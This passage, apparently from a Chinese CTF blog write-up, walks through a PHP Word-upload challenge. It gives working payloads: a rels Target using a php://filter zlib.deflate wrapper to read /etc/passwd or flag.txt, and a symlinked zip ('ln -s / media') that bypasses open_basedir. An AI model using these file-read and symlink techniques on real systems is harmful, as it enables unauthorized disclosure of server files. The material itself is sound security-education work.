+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;div class=&#34;</span><span class="nx">container</span> <span class="nx">text</span><span class="o">-</span><span class="nx">center</span> <span class="nx">mt</span><span class="o">-</span><span class="mi">5</span><span class="s2">&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            &lt;h1 class=&#34;</span><span class="nx">display</span><span class="o">-</span><span class="mi">4</span><span class="s2">&#34;&gt;Scan Results&lt;/h1&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            &lt;?php if (!empty(</span><span class="si">$messages</span><span class="s2">)): ?&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                &lt;div class=&#34;</span><span class="nx">alert</span> <span class="nx">alert</span><span class="o">-</span><span class="nx">success</span> <span class="nx">mt</span><span class="o">-</span><span class="mi">4</span><span class="s2">&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    &lt;h4&gt;Hidden Messages Found:&lt;/h4&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    &lt;ul class=&#34;</span><span class="k">list</span><span class="o">-</span><span class="nx">group</span><span class="s2">&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                        &lt;?php foreach (</span><span class="si">$messages</span><span class="s2"> as </span><span class="si">$message</span><span class="s2">): ?&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                            &lt;li class=&#34;</span><span class="k">list</span><span class="o">-</span><span class="nx">group</span><span class="o">-</span><span class="nx">item</span><span class="s2">&#34;&gt; &lt;?= htmlspecialchars(</span><span class="si">$message</span><span class="s2">) ?&gt; &lt;/li&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                        &lt;?php endforeach; ?&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    &lt;/ul&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            &lt;?php else: ?&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                &lt;div class=&#34;</span><span class="nx">alert</span> <span class="nx">alert</span><span class="o">-</span><span class="nx">info</span> <span class="nx">mt</span><span class="o">-</span><span class="mi">4</span><span class="s2">&#34;&gt;No hidden messages found.&lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            &lt;?php endif; ?&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            &lt;a href=&#34;</span><span class="nx">index</span><span class="o">.</span><span class="nx">php</span><span class="s2">&#34; class=&#34;</span><span class="nx">btn</span> <span class="nx">btn</span><span class="o">-</span><span class="nx">secondary</span> <span class="nx">mt</span><span class="o">-</span><span class="mi">3</span><span class="s2">&#34;&gt;Back to Home&lt;/a&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;/body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;/html&gt;
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>主要代码逻辑可以看到是如上的，是一个处理文件上传的代码逻辑，从中可以看到对文件上传的包进行了一些处理，比如要求为POST传参，需要input变量并且要求上传的文件的Content-Type需要为application/vnd.openxmlformats-officedocument.wordprocessingml.document，也就是word文档的内容，再看后续逻辑：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$zip</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ZipArchive</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$zipFilename</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;input&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">open</span><span class="p">(</span><span class="nv">$zipFilename</span><span class="p">)</span> <span class="o">!==</span> <span class="k">true</span> <span class="o">||</span> <span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">locateName</span><span class="p">(</span><span class="nx">REL_FILENAME</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">reSponYour</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="s1">&#39;File is not a valid Word document.&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$relsDom</span> <span class="o">=</span> <span class="nx">simplexml_load_string</span><span class="p">(</span><span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">getFromName</span><span class="p">(</span><span class="nx">REL_FILENAME</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$relsDom</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">reSponYour</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="s1">&#39;Invalid object relationship table. Document may be corrupted.&#39;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到使用了ZipArchive()来对上传的word文档进行解压，并且做过misc的都知道，word文档都是可以改成zip然后解压查看内容的，所以这里很合理，但是同样催生出一个东西，我们可以上传zip文件，抓包修改type为指定内容即可。</p>
+<p>然后可以看到调用了locateName()要求解压后的文件包含word/_rels/document.xml.rels文件，这个可以在我们自定义在zip包中压缩一个即可，然后对document.xml.rels文件内容调用了simplexml_load_string()进行了处理，最开始以为这里考的一个xxe，但是从后面的代码逻辑看起来发现并不是。</p>
+<p>再往后面看就是创建了一个临时目录，然后调用unzip将上传的文件的word/media目录下的文件解压到临时目录下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$tmpDir</span> <span class="o">=</span> <span class="nx">exec</span><span class="p">(</span><span class="s2">&#34;mktemp -d --tmpdir=/tmp/ zipXXXXXX&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">shell_exec</span><span class="p">(</span><span class="s2">&#34;unzip </span><span class="si">$zipFilename</span><span class="s2"> </span><span class="se">\&#34;</span><span class="s2">word/media*</span><span class="se">\&#34;</span><span class="s2"> -d </span><span class="se">\&#34;</span><span class="si">$tmpDir\</span><span class="s2">&#34;&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="s2">function cleanup(</span><span class="si">$tmpDir</span><span class="s2">) { shell_exec(&#34;</span><span class="nx">rm</span> <span class="o">-</span><span class="nx">rf</span> <span class="nv">$tmpDir</span><span class="s2">&#34;); }
+</span></span></span><span class="line"><span class="cl"><span class="s2">register_shutdown_function(&#39;cleanup&#39;, </span><span class="si">$tmpDir</span><span class="s2">); // cleanup in the end
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">chdir(&#34;</span><span class="nv">$tmpDir</span><span class="o">/</span><span class="nx">word</span><span class="o">/</span><span class="nx">media</span><span class="s2">&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="s2">ini_set(&#39;open_basedir&#39;, &#39;.&#39;);
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后进入对应目录并设置了open_basedir。在这里是直接对zip进行的解压缩的，所以不可避免的就是存在一个软链接漏洞，并且从这里的要求可以看出也需要上传的zip文件中存在word/media目录，然后最关键的处理如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$messages</span> <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$relsDom</span><span class="o">-&gt;</span><span class="na">Relationship</span> <span class="k">as</span> <span class="nv">$rel</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$rel</span><span class="p">[</span><span class="s1">&#39;Type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">str_starts_with</span><span class="p">(</span><span class="nv">$rel</span><span class="p">[</span><span class="s1">&#39;Target&#39;</span><span class="p">],</span> <span class="s1">&#39;media/&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$rel</span><span class="p">[</span><span class="s1">&#39;Target&#39;</span><span class="p">],</span> <span class="mi">6</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$file</span> <span class="o">=</span> <span class="o">@</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="c1">// Object relationship table points to inexistent file. Document may be corrupted
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$result</span> <span class="o">=</span> <span class="o">@</span><span class="nx">zlib_decode</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span> <span class="c1">// This will expose them hackers!
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$messages</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// cleanup
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">system</span><span class="p">(</span><span class="s2">&#34;rm -rf </span><span class="si">$tmpDir</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里对我们前面获取到的word/_rels/document.xml.rels文件内容进行了处理，可以看到需要满足一些条件，这个我们直接让ai给出即可：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;Relationships</span> <span class="na">xmlns=</span><span class="s">&#34;http://schemas.openxmlformats.org/package/2006/relationships&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Relationship</span>
+</span></span><span class="line"><span class="cl">        <span class="na">Id=</span><span class="s">&#34;rId1&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="na">Type=</span><span class="s">&#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="na">Target=</span><span class="s">&#34;media/hack.png&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/Relationships&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这样就符合前面的if条件，然后可以看到存在漏洞点的是file_get_contents()函数，并且从给的提示或者dockerfile中可以看到是需要读取根目录下的flag.txt，然后参数来源就是上述的Target的值，调用了substr()函数来借去了<code>media/</code>后的内容，所以我们可以尝试如下控制文件内容：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;Relationships</span> <span class="na">xmlns=</span><span class="s">&#34;http://schemas.openxmlformats.org/package/2006/relationships&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Relationship</span>
+</span></span><span class="line"><span class="cl">        <span class="na">Id=</span><span class="s">&#34;rId1&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="na">Type=</span><span class="s">&#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="na">Target=</span><span class="s">&#34;media//etc/passwd&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/Relationships&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>从而可以达到文件控制要读取的文件的文件名称，但是在后面读取完了后，又调用了@zlib_decode()来进行解压缩，成功解压缩才会将其赋值给<code>$messages</code>，从而输出到前端，怎么解决呢，注意file_get_contents()这是一个文件包含函数，并且参数可控，最有名的是什么，php fileter，是的，我们可以使用php伪协议先将其压缩一遍，然后这里再进行解压缩的时候就可以正常输出，可以本地尝试一下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="s1">&#39;&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;Relationships xmlns=&#34;http://schemas.openxmlformats.org/package/2006/relationships&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &lt;Relationship
+</span></span></span><span class="line"><span class="cl"><span class="s1">        Id=&#34;rId1&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        Type=&#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        Target=&#34;media/php://filter/zlib.deflate/resource=/etc/passwd&#34;/&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;/Relationships&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$relsDom</span> <span class="o">=</span> <span class="nx">simplexml_load_string</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$messages</span> <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$relsDom</span><span class="o">-&gt;</span><span class="na">Relationship</span> <span class="k">as</span> <span class="nv">$rel</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$rel</span><span class="p">[</span><span class="s1">&#39;Type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//        if (!str_starts_with($rel[&#39;Target&#39;], &#39;media/&#39;))
+</span></span></span><span class="line"><span class="cl"><span class="c1">//            continue;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$rel</span><span class="p">[</span><span class="s1">&#39;Target&#39;</span><span class="p">],</span> <span class="mi">6</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">var_dump</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$file</span> <span class="o">=</span> <span class="o">@</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="c1">// Object relationship table points to inexistent file. Document may be corrupted
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$result</span> <span class="o">=</span> <span class="o">@</span><span class="nx">zlib_decode</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span> <span class="c1">// This will expose them hackers!
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$messages</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">var_dump</span><span class="p">(</span><span class="nv">$messages</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>成功输出内容，但是题目中还存在一个open_basedir的限制，当我们进入到<code>$tmpDir/word/media</code>后，就设置了只能读当前目录：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$tmpDir</span><span class="s2">/word/media&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以需要绕过，查看绕过open_basedir的文章，可以看到一个使用利用symlink绕过进行绕过的方式，就是使用了一个软链接的方式，通知已经非常常见的zip包的软链接的打法，所以自然就想到了使用软链接来绕过，也就是如下命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">先创建目录，然后创建软链接即可。
+</span></span><span class="line"><span class="cl">ln -s A/B/C/D <span class="nb">test</span>
+</span></span><span class="line"><span class="cl">ln -s test/../../../../../../../../../../../../../../etc/passwd exp
+</span></span><span class="line"><span class="cl">rm <span class="nb">test</span>
+</span></span><span class="line"><span class="cl">mkdir <span class="nb">test</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是虽然是成功创建了软链接，但是还是绕不了open_basedir，也确实和其原本的实现代码有出入。后面再看wp，是一个非常妙的方法，是直接将media软链接到根目录，这样unzip解压时就链接过去，然后chdir时起时也是进入的根目录，设置的open_basedir也就是根目录了，挺妙的一个思路，所以如下打即可：</p>
+<p>本地创建文件：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250812155121142.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250812155121142"
+	
+	
+></p>
+<p>文件内容为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;Relationships</span> <span class="na">xmlns=</span><span class="s">&#34;http://schemas.openxmlformats.org/package/2006/relationships&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Relationship</span>
+</span></span><span class="line"><span class="cl">        <span class="na">Id=</span><span class="s">&#34;rId1&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="na">Type=</span><span class="s">&#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="na">Target=</span><span class="s">&#34;media/php://filter/zlib.deflate/resource=flag.txt&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/Relationships&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后在word目录下创建media软链接：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ln -s / media
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ..
+</span></span><span class="line"><span class="cl">zip -r --symlinks word.zip word
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后上传生成的word.zip文件即可：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250812155246690.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250812155246690"
+	
+	
+></p>
+<p>成功获取到flag:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{1fi_z1ib_y0ur_k3OOOOw}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>————————————————</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/2025%E6%B9%BE%E5%8C%BA%E6%9D%AFweb%E5%85%A8%E8%A7%A3/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025湾区杯web全解</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bwp/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">第十届上海市大学生网络安全大赛wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/aliyunctf2025wp/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Aliyunctf2025[WP]</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/n1ctf-junior-2025/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">N1CTF Junior 2025</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B2025wp/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">软件系统安全赛2025wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2025 Example Person
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
